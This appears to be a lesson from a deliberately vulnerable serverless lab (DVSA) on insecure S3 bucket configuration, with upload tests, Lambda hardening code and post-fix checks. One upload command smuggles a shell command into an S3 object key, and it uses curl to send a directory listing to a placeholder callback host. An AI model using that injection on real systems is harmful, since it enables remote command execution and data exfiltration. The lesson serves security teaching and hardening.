# Lesson 04 - Insecure Cloud Configuration

> Use only your own DVSA receipt bucket. Bucket names below are placeholders.

## Prepare a local file

```bash
touch ~/empty
```

## Pre-fix direct upload test

```bash
aws s3 cp ~/empty \
  's3://<dvsa-receipts-bucket>/2020/20/20/AAAA_BBBB.raw' \
  --acl public-read
```

## Verify backend processing

```bash
aws s3 ls s3://<dvsa-receipts-bucket>/2020/20/20/
```

Expected pre-fix evidence:

```text
AAAA_BBBB.raw
AAAA_BBBB.txt
```

## Riskier object-key test shown in the report

The report also tested a crafted object name to show why object keys and shell execution are dangerous:

```bash
aws s3 cp ~/empty \
  's3://<dvsa-receipts-bucket>/2020/20/20/null_;curl https://<callback>?data="$(ls)";echo x.raw' \
  --acl public-read
```

## Lambda hardening pattern

```python
key = urllib.parse.unquote_plus(event['Records'][0]['s3']['object']['key'])

if not key.endswith('.raw'):
    print('Rejecting unexpected receipt object:', key)
    return
```

Replace shell-based file writing:

```python
# Avoid os.system() for simple file writing.
with open(download_path, "a") as f:
    f.write("\t----------------------\n\t\tDate: {}\n".format(date))
```

## Post-fix verification

After enabling S3 Block Public Access, repeat:

```bash
aws s3 cp ~/empty \
  's3://<dvsa-receipts-bucket>/2020/20/20/TEST.raw' \
  --acl public-read
```

Expected result:

```text
AccessDenied
```
